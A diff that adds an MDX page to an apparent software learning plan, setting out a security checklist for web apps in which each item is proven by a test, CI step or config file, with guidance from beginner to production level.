+    ['Escape output; no innerHTML with user data', 'Lint rule; XSS payload test'],
+    ['Rate-limit login and expensive endpoints', 'N+1 request test expects 429'],
+    ['Log events without personal data', 'Logger redact list; grep of logs is clean'],
+    ['Patch dependencies on a schedule', 'Renovate or Dependabot config; npm audit in CI'],
+  ]}
+/>
+
+<Levels label="Phase 4, the security checklist and the gate">
+
+<Level name="Beginner">
+
+The plan gives a minimum checklist for every app. Signing it off means each item has evidence a stranger could
+check, not just my belief. The table above is the evidence I collect: a test, a config file or a CI step for
+each line.
+
+The gate for this phase is: make a failing test pass, add CI, find a security bug and read a flame graph. Each
+part maps to work already done: the failing test is any bug fixed test-first; CI is the gate that blocks red;
+the security bug comes from the OWASP walk; the flame graph comes from the INP investigation.
+
+</Level>
+
+<Level name="Intermediate">
+
+I keep the checklist as a markdown file in the repository, `SECURITY_CHECKLIST.md`, with a link for each item to
+the test or config that proves it, and a date. Reviewing it is part of the PR template for any change touching
+auth, uploads or user data.
+
+```md
+- [x] Authorization on every record. Proof: tests/integration/isolation.test.ts (12 routes). 2026-04-02
+- [x] Rate limit on login. Proof: tests/integration/ratelimit.test.ts. 2026-04-02
+```
+
+</Level>
+
+<Level name="Advanced">
+
+A checklist is a floor, not a ceiling. Threat modelling each new feature adds items specific to it (file
+upload adds content-type checks, size limits and a separate serving domain). Automated tools help: dependency
+audit, secret scanning, a dynamic scanner like OWASP ZAP run against staging for headers and common injection
+points.
+
+</Level>
+
+<Level name="Edge cases">
+
+An item that does not apply (no file uploads, so no upload checks) is still written down with the reason, so a
+later feature that adds uploads reopens it.
+
+</Level>
+
+<Level name="Corner cases">
+
+A checklist item proven once and then broken by a later change: the isolation test covers twelve routes, and
+a thirteenth route is added without one. A test that enumerates all routes from the router and fails if any
+lacks an isolation test closes that gap.
+
+</Level>
+
+<Level name="Production level">
+
+The checklist is reviewed on a schedule (monthly) and after every security-relevant incident, and dependency
+patches land weekly through automated PRs that CI gates.
+
+</Level>
+
+<Level name="Mindset">
+
+Security is a property I keep proving, not a box I tick once.
+
+</Level>
+
+<Level name="System design">
+
+The checklist becomes the baseline for every future service: a template repository with these controls built
+in makes the next app secure by default.
+
+</Level>
+
+<Level name="Strategy">
+
+Fill in the evidence table, fix every missing item, then take the gate cold: pick a bug from my log I have not
+fixed, write the failing test, fix it, push through CI, and explain a flame graph and a security finding to
+someone else.
+
+Done when every checklist line links to proof, a red build has blocked a bad change, the main journey has an
+end-to-end test, the load test has a number, and the postmortem is written. That is the plan's proof for Phase 4.
+
+</Level>
+
+</Levels>
